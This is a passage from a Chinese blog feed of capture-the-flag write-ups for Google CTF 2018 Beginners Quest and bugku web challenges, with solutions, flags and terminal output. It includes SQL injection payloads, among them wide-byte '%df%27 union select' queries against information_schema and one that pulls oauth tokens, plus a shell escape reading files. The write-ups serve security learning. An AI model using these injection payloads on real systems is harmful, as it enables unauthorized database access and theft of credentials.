alt="1529761537369"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529761581745.png" alt="1529761581745"></p><p>打开txt即有flag</p><blockquote><p>CTF{qeY80sU6Ktko8BJW}</p></blockquote><h2 id="FLOPPY2-misc"><a href="#FLOPPY2-misc" class="headerlink" title="FLOPPY2[misc]"></a>FLOPPY2[misc]</h2><p>Foobanizer9000</p><blockquote><p>Looks like you found a way to open the file in the floppy! But that <a href="http://www.com" target="_blank" rel="noopener">www.com</a> file looks suspicious.. Dive in and take another look? </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!&#123;p*S:eTM&apos;~_?o?V;m;CgAA]Ud)HO;&#123; l&#123;&#125;9l&gt;jLLP[-`|0gvPY0onQ0geZ0wY5&gt;D0g]h+(X-k&amp;4`P[0/,64&quot;P4APG</span><br><span class="line">The Foobanizer9000 is no longer on the OffHub DMZ.          $</span><br></pre></td></tr></table></figure><h2 id="OCR-IS-COOL-misc"><a href="#OCR-IS-COOL-misc" class="headerlink" title="OCR IS COOL![misc]"></a>OCR IS COOL![misc]</h2><p>Foobanizer9000</p><blockquote><p>Caesar once said, don’t stab me… but taking a screenshot of an image sure feels like being stabbed. You connected to a VNC server on the Foobanizer 9000, it was view only. This screenshot is all that was present but it’s gibberish. Can you recover the original text? </p></blockquote><p>7ad5a7d71a7ac5f5056bb95dd326603e77a38f25a76a1fb7f7e6461e7d27b6a3.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Wxtk Vnlmhfxk</span><br><span class="line">Px tkx atir mh pxevhfx tI hnk gxpxlm vnlmhfxk hy hnk lxvnkx bWkhiwkbox vehnw ybex latkbgz lxkobvx. T Ityx ietvx yhk tee rhnk ybexl</span><br><span class="line"></span><br><span class="line">Lmhkx tgr ybex</span><br><span class="line">bWkhiwkbox Imtkml rhn pbma 15 lU hy ykxx hgebgx hk hyyebgx Imhktzx, Ih rhn vtg dxxi ptkxs, ubgtkbxl, itbgmbgzl, yetzl, ybkfptkxl, ubmvhbgl, pkbmxnil-tgrmabgz</span><br><span class="line"></span><br><span class="line">LXX thnk Imnyy tgrpaxk</span><br><span class="line">Rhnk ybexl bg bWkhiWkbox vtg ux kxtvaxw ykhf tgr yhhutgbsxk, Iftkm ykbwZX 2000, Iftkm atl, Mxfih-t-ftmbv, hk fxwbt iv Lh paxkxoxk rhn zh, rhnk ybexl yheehp</span><br><span class="line"></span><br><span class="line">Latkx ybexl tgw yhewxkl</span><br><span class="line">Rhn vtg jnbvder bgobmx hmaxkl mh obp, whpgehtw, tgw vheetuhktmx hg tee max ybexl rhn ptgm obt xftbe tmmtvafxgml Cnlm zbox maxf max ebgd VMY&#123;vtxltkvbiaxkbltInulmbmnmbhgvbiaxk&#125; tgw maxr vtg twvxll tee rhnk wtmt</span><br><span class="line"></span><br><span class="line">Yhk xqtfiex, axkx&apos;l t eblm hy ybexl mat rhn kx vnkkxgmer Imhkbgz pbma nl</span><br><span class="line">hyyanu ybkfptkx ubg</span><br><span class="line">BHM vkxwxgmbtel iwy \\(wxexmxw\)Pbgmxkfnmxw</span><br><span class="line">Yhhutgbsxk9000 Ftgnte iwy Pbgmxkfnmxw</span><br><span class="line">yhh bvh</span><br><span class="line"></span><br><span class="line">LBgvx px mdx lxvnkbmr oxkr bxkbhnler tgw bg hkwxk mh ikhmxvm rhn tztbglm onegxktubebmbxl ebdx xytbe tgw tfwyetpl, px&apos;kx lxgwbgz rhn rhnk vkxwxgmbtel nlbgz max mbfx-ikhoxg tbebmtkr-zktwx vtxltk Irftxmkbv vbiaxk</span><br><span class="line"></span><br><span class="line">Atiir bwkhiwkbobgz</span><br></pre></td></tr></table></figure><p>单表替换什么的吧，暴力一把梭</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p><p><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Dear Customer</span><br><span class="line">We are hapy to welcome aP our newest customer of our secure iDropdrive cloud file sharing service. A Pafe place for all your files</span><br><span class="line"></span><br><span class="line">Store any file</span><br><span class="line">iDropdrive Ptarts you with 15 sB of free online or offline Ptorage, Po you can keep warez, binaries, paintings, flags, firmwares, bitcoins, writeups-anything</span><br><span class="line"></span><br><span class="line">SEE aour Ptuff anywher</span><br><span class="line">Your files in iDropDrive can be reached from any foobanizer, Pmart fridGE 2000, Pmart has, Tempo-a-matic, or media pc So wherever you go, your files follow</span><br><span class="line"></span><br><span class="line">Share files and folders</span><br><span class="line">You can quickly invite others to viw, download, and collaborate on all the files you want via email attachments Just give them the link CTF&#123;pcaesarcipherisaPubstitutioncipher&#125;  and they can access all your data</span><br><span class="line"></span><br><span class="line">For example, here&apos;s a list of files tha you re currently Ptoring with us</span><br><span class="line">offhub firmware bin</span><br><span class="line">IOT credentials pdf \\(deleted\)Wintermuted</span><br><span class="line">Foobanizer9000 Manual pdf Wintermuted</span><br><span class="line">foo ico</span><br><span class="line"></span><br><span class="line">SInce we tke security very ieriously and in order to protect you against vulnerabilities like efail and amdflaws, we&apos;re sending you your credentials using the time-proven ailitary-grade caesar Pymaetric cipher</span><br><span class="line"></span><br><span class="line">Happy idropdriving</span><br></pre></td></tr></table></figure><p>可能有些许偏差，上google翻译，再修改一下小写</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529763781681.png" alt="1529763781681"></p><blockquote><p>CTF{caesarcipherisasubstitutioncipher}</p></blockquote><h2 id="SECURITY-BY-OBSCURITY-misc"><a href="#SECURITY-BY-OBSCURITY-misc" class="headerlink" title="SECURITY BY OBSCURITY[misc]"></a>SECURITY BY OBSCURITY[misc]</h2><p>OffHub</p><blockquote><p>Reading the contents of the screenshot you find that some guy named “John” created the firmware for the OffHub router and stored it on an iDropDrive cloud share. You fetch it and find “John” packed the firmware with an unknown key. Can you recover the package key? </p></blockquote><p>2cdc6654fb2f8158cd976d8ffac28218b15d052b5c2853232e4c1bafcb632383.zip</p><h2 id="MOAR-pwn"><a href="#MOAR-pwn" class="headerlink" title="MOAR[pwn]"></a>MOAR[pwn]</h2><p>Foobanizer9000</p><blockquote><p>Finding yourself on the Foobanizer9000, a computer built by 9000 foos, this computer is so complicated luckily it serves manual pages through a network service. As the old saying goes, everything you need is in the manual. </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!ls -al /home</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 nobody nogroup 4096 Jun 14 14:17 .</span><br><span class="line">drwxr-xr-x 21 moar   moar    4096 Jun 22 09:20 ..</span><br><span class="line">drwxr-xr-x  2 nobody nogroup 4096 Jun 22 08:36 moar</span><br></pre></td></tr></table></figure><p>题目是moar，就去moar目录搜查一波，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">!ls -al /home/moar</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 nobody nogroup 4096 Jun 22 08:36 .</span><br><span class="line">drwxr-xr-x 3 nobody nogroup 4096 Jun 14 14:17 ..</span><br><span class="line">-rw-r--r-- 1 nobody nogroup  220 Aug 31  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 nobody nogroup 3771 Aug 31  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 nobody nogroup  655 May 16  2017 .profile</span><br><span class="line">-r-xr-xr-x 1 nobody nogroup  118 Jun 22 07:58 disable_dmz.sh</span><br></pre></td></tr></table></figure><p>发现有 .sh文件，读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!cat /home/moar/disable_dmz.sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">echo &apos;Disabling DMZ using password CTF&#123;SOmething-CATastr0phic&#125;&apos;</span><br><span class="line">echo CTF&#123;SOmething-CATastr0phic&#125; &gt; /dev/dmz</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531481681852.png" alt="1531481681852"></p><blockquote><p>CTF{SOmething-CATastr0phic}</p></blockquote><h2 id="ADMIN-UI-pwn-re"><a href="#ADMIN-UI-pwn-re" class="headerlink" title="ADMIN UI[pwn-re]"></a>ADMIN UI[pwn-re]</h2><p>Temp-o-matic</p><blockquote><p>The command you just found removed the Foobanizer 9000 from the DMZ. While scanning the network, you find a weird device called Tempo-a-matic. According to a Google search it’s a smart home temperature control experience. The management interface looks like a nest of bugs. You also stumble over some gossip on the dark net about bug hunters finding some vulnerabilities and because the vendor didn’t have a bug bounty program, they were sold for US$3.49 a piece. Do some black box testing here, it’ll go well with your hat.</p><p>nc mngmnt-iface.ctfcompetition.com 1337</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531647764855.png" alt="1531647764855"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531647829031.png" alt="1531647829031"></p><blockquote><p>CTF{I_luv_buggy_sOFtware}</p></blockquote><h2 id="ADMIN-UI-2-pwn-re"><a href="#ADMIN-UI-2-pwn-re" class="headerlink" title="ADMIN UI 2[pwn-re]"></a>ADMIN UI 2[pwn-re]</h2><p>Temp-o-matic</p><blockquote><p>That first flag was a dud, but I think using a similar trick to get the full binary file might be needed here. There is a least one password in there somewhere. Maybe reversing this will give you access to the authenticated area, then you can turn up the heat… literally. </p></blockquote><h2 id="FIRMWARE-re"><a href="#FIRMWARE-re" class="headerlink" title="FIRMWARE [re]"></a>FIRMWARE [re]</h2><p>Offhub</p><blockquote><p>After unpacking the firmware archive, you now have a binary in which to go hunting. Its now time to walk around the firmware and see if you can find anything.</p></blockquote><p>解压两次后是ext4，linux文件系统，挂在到linux系统的某目录下即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents# mkdir x</span><br><span class="line">root@kali:~/Documents# sudo mount -o loop ./challenge2.ext4 x</span><br><span class="line">root@kali:~/Documents# cd x</span><br><span class="line">root@kali:~/Documents/x# ls</span><br><span class="line">bin   dev  home  lib64       media  opt   root  sbin  sys  usr</span><br><span class="line">boot  etc  lib   lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line">root@kali:~/Documents/x# ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 22 root root  1024 Jun 22 21:54 .</span><br><span class="line">drwxr-xr-x  3 root root  4096 Jul 16 10:37 ..</span><br><span class="line">drwxr-xr-x  2 root root  3072 Jun 22 21:54 bin</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 boot</span><br><span class="line">drwxr-xr-x  4 root root  1024 Jun 22 21:54 dev</span><br><span class="line">drwxr-xr-x 52 root root  4096 Jun 22 21:54 etc</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 home</span><br><span class="line">drwxr-xr-x 12 root root  1024 Jun 22 21:54 lib</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 lib64</span><br><span class="line">drwx------  2 root root 12288 Jun 22 21:51 lost+found</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 media</span><br><span class="line">-rw-r--r--  1 root root    40 Jun 22 21:54 .mediapc_backdoor_password.gz</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 mnt</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 opt</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 proc</span><br><span class="line">drwx------  2 root root  1024 Jun 22 21:54 root</span><br><span class="line">drwxr-xr-x  4 root root  1024 Jun 22 21:54 run</span><br><span class="line">drwxr-xr-x  2 root root  3072 Jun 22 21:54 sbin</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 srv</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 sys</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 tmp</span><br><span class="line">drwxr-xr-x 10 root root  1024 Jun 22 21:54 usr</span><br><span class="line">drwxr-xr-x  9 root root  1024 Jun 22 21:54 var</span><br><span class="line">root@kali:~/Documents/x# file .mediapc_backdoor_password.gz </span><br><span class="line">.mediapc_backdoor_password.gz: gzip compressed data, last modified: Fri Jun 22 13:54:27 2018, from Unix, original size 20</span><br><span class="line">root@kali:~/Documents/x# gunzip .mediapc_backdoor_password.gz </span><br><span class="line">root@kali:~/Documents/x# ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 22 root root  1024 Jul 16 10:39 .</span><br><span class="line">drwxr-xr-x  3 root root  4096 Jul 16 10:37 ..</span><br><span class="line">drwxr-xr-x  2 root root  3072 Jun 22 21:54 bin</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 boot</span><br><span class="line">drwxr-xr-x  4 root root  1024 Jun 22 21:54 dev</span><br><span class="line">drwxr-xr-x 52 root root  4096 Jun 22 21:54 etc</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 home</span><br><span class="line">drwxr-xr-x 12 root root  1024 Jun 22 21:54 lib</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 lib64</span><br><span class="line">drwx------  2 root root 12288 Jun 22 21:51 lost+found</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 media</span><br><span class="line">-rw-r--r--  1 root root    20 Jun 22 21:54 .mediapc_backdoor_password</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 mnt</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 opt</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 proc</span><br><span class="line">drwx------  2 root root  1024 Jun 22 21:54 root</span><br><span class="line">drwxr-xr-x  4 root root  1024 Jun 22 21:54 run</span><br><span class="line">drwxr-xr-x  2 root root  3072 Jun 22 21:54 sbin</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 srv</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 sys</span><br><span class="line">drwxr-xr-x  2 root root  1024 Jun 22 21:54 tmp</span><br><span class="line">drwxr-xr-x 10 root root  1024 Jun 22 21:54 usr</span><br><span class="line">drwxr-xr-x  9 root root  1024 Jun 22 21:54 var</span><br><span class="line">root@kali:~/Documents/x# file .mediapc_backdoor_password </span><br><span class="line">.mediapc_backdoor_password: ASCII text</span><br><span class="line">root@kali:~/Documents/x# cat .mediapc_backdoor_password </span><br><span class="line">CTF&#123;I_kn0W_tH15_Fs&#125;</span><br><span class="line">root@kali:~/Documents/x# sudo umount x</span><br><span class="line">umount: x: no mount point specified.</span><br><span class="line">root@kali:~/Documents/x# cd ..</span><br><span class="line">root@kali:~/Documents# sudo umount x</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531709014530.png" alt="1531709014530"></p><p>挂起系统( x 是一个文件夹)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents# sudo mount -o loop ./challenge2.ext4 x</span><br></pre></td></tr></table></figure><p>用完之后卸载，避免占据空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents# sudo umount x</span><br></pre></td></tr></table></figure><blockquote><p>CTF{I_kn0W_tH15_Fs}</p></blockquote><h2 id="JS-SAFE-web"><a href="#JS-SAFE-web" class="headerlink" title="JS SAFE[web]"></a>JS SAFE[web]</h2><p>Aluminum-Key</p><blockquote><p>Well it’s definitely the 90s. Using what was found in the mysterious .ico file, you extract the driver for the Aluminum-Key Hardware password storage device. Let’s see what it has in store.</p></blockquote><h2 id="ROUTER-UI-web"><a href="#ROUTER-UI-web" class="headerlink" title="ROUTER-UI[web]"></a>ROUTER-UI[web]</h2><p>Offhub</p><blockquote><p>Using the domain found on the hardened aluminum key, you make your way on to the OffHub router. A revolutionary device that simplifies your life. You’re at the UI page, but attempting to brute force the password failed miserably. If we could find an XSS on the page then we could use it to steal the root user session token. In case you find something, try to send an email to <a href="mailto:wintermuted@googlegroups.com" target="_blank" rel="noopener">wintermuted@googlegroups.com</a>. If you claim your link includes cat pictures, I’m sure Wintermuted will click it. I hope Chrome’s XSS filter will not block the exploit though.</p><p><a href="https://router-ui.web.ctfcompetition.com/" target="_blank" rel="noopener">https://router-ui.web.ctfcompetition.com/</a> </p></blockquote><h2 id="GATEKEEPER-re"><a href="#GATEKEEPER-re" class="headerlink" title="GATEKEEPER[re]"></a>GATEKEEPER[re]</h2><p>WebPluxMediaPC</p><blockquote><p>It’s a media PC! All fully purchased through the online subscription revolution empire “GimmeDa$”. The PC has a remote control service running that looks like it’ll cause all kinds of problems or that was written by someone who watched too many 1990s movies. You download the binary from the vendor and begin reversing it. Nothing is the right way around.</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531717233138.png" alt="1531717233138"></p><blockquote><p>CTF{I_g0T_m4d_sk1lLz}</p></blockquote><p>参考：<a href="https://github.com/rtoma/google-ctf2018/blob/master/Gatekeeper.md" target="_blank" rel="noopener">https://github.com/rtoma/google-ctf2018/blob/master/Gatekeeper.md</a></p><h2 id="MEDIA-DB-misc"><a href="#MEDIA-DB-misc" class="headerlink" title="MEDIA-DB[misc]"></a>MEDIA-DB[misc]</h2><p>WebPluxMediaPC</p><blockquote><p>The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.</p><p>nc media-db.ctfcompetition.com 1337</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,oauth_token from oauth_tokens --</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1531717887269.png" alt="1531717887269"></p><p><a href="https://github.com/rtoma/google-ctf2018/blob/master/Media-DB.md" target="_blank" rel="noopener">https://github.com/rtoma/google-ctf2018/blob/master/Media-DB.md</a></p><h2 id="FRIDGE-TODO-LISTS-pwn"><a href="#FRIDGE-TODO-LISTS-pwn" class="headerlink" title="FRIDGE TODO LISTS[pwn]"></a>FRIDGE TODO LISTS[pwn]</h2><p>martFridge2000</p><blockquote><p>One of the main selling points of smart fridge 2000 over the smart fridge 1999 is that it comes with a TODO list network service. We heard that Wintermuted uses this list as a password storage, maybe you can find a bug to leak their notes? Luckily we found the source code of the TODO list on the vendor’s website.</p><p>nc fridge-todo-list.ctfcompetition.com 1337</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;比赛：&lt;a href=&quot;https://capturetheflag.withgoogle.com/#beginners/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://capturetheflag.withgoogle.com/#begi
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>bugku-web-Writeup</title>
    <link href="http://blog.Lhaihai.wang/2018/07/13/bugku-web-Writeup/"/>
    <id>http://blog.Lhaihai.wang/2018/07/13/bugku-web-Writeup/</id>
    <published>2018-07-13T02:57:21.000Z</published>
    <updated>2018-07-13T03:32:37.762Z</updated>
    
    <content type="html"><![CDATA[<p>慢慢刷了这么多题目，需要总结一下</p><a id="more"></a><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote><p>听说聪明的人都能找到答案<a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a> </p></blockquote><p>查看源代码即可发现，F12</p><blockquote><p>KEY{Web-2-bugKssNNikls9100}</p></blockquote><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><blockquote><p><a href="http://103.238.227.13:10085/" target="_blank" rel="noopener">http://103.238.227.13:10085/</a></p><p>Flag格式：Flag:xxxxxxxxxxxxx</p></blockquote><p>bp抓包改content-type为image/jpeg就行了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526912306079.png" alt="1526912306079"></p><blockquote><p>Flag:42e97d465f962c53df9549377b513c7e </p></blockquote><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a> </p></blockquote><p>输入的时候发现只能输入一位数字，F12修改maxlength即可</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526912420436.png" alt="1526912420436"></p><blockquote><p>flag{CTF-bugku-0032}</p></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote><p>flag就在这里快来找找吧 <a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a> </p></blockquote><p>查看源代码，在最后发现</p><blockquote><p>&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&amp;#125 </p></blockquote><p>熟悉的同学就知道这是Unicode编码，Unicode解密一下就得到key</p><p>Unicode解码网址：<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><blockquote><p>KEY{J2sa42ahJK-HS11III}</p></blockquote><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><blockquote><p><a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p><p>格式KEY{}</p></blockquote><p>进来一看</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526914080428.png" alt="1526914080428"></p><blockquote><p>查询key表,id=1的string字段 ，这个应该就是flag了</p></blockquote><p>查看源代码，发现是gb2312，想到宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;gb2312&quot; /&gt;</span><br></pre></td></tr></table></figure><p>尝试一下，得到下面报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27</span><br></pre></td></tr></table></figure><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’1運’’  LIMIT 1’ at line 1 </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526914024002.png" alt="1526914024002"></p><p>获得数据库 sql5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/index.php</span><br><span class="line">?id=1%df%27 union select user(),database() %23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526913249659.png" alt="1526913249659"></p><p>获得表 key，test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() %23</span><br></pre></td></tr></table></figure><p>获得列 id ,string(  0x6b6579 是 key的16进制)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6b6579 %23</span><br></pre></td></tr></table></figure><p>获得string</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(string) from sql5.key %23</span><br></pre></td></tr></table></figure><blockquote><p>KEY{54f3320dc261f313ba712eb3f13a1f6d }</p></blockquote><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><blockquote><p>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag </p></blockquote><p>windows下修改域名解析的 文件为：</p><p>c:\windows\system32\drivers\etc\hosts </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526918093124.png" alt="1526918093124"></p><p>加上后访问flag.bugku.com就可以拿到flag</p><blockquote><p>KEY{DSAHDSJ82HDS2211} </p></blockquote><p><a href="https://blog.csdn.net/qq_32447321/article/details/76269619" target="_blank" rel="noopener">配置windows下域名解析</a> </p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><blockquote><p>地址：<a href="http://103.238.227.13:10087/" target="_blank" rel="noopener">http://103.238.227.13:10087/</a></p><p>提示：过滤了关键字 你能绕过他吗</p><p>flag格式KEY{xxxxxxxxxxxxx}</p></blockquote><blockquote><p>访问参数为：?id=x</p><p>查找表为key的数据表，id=1值hash字段值</p></blockquote><p>题目意思是要找数据表key的hash字段</p><figure class="highlight 